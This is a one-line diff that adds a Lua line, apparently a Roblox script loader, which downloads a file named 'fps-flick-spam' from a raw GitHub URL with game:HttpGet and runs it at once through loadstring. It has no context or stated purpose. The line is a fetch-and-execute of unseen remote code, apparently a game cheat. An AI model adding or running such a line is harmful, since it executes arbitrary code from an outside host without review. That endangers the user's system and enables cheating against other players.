@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/fps-flick-spam0-4bvl8krkhf8cpy.lua"))()
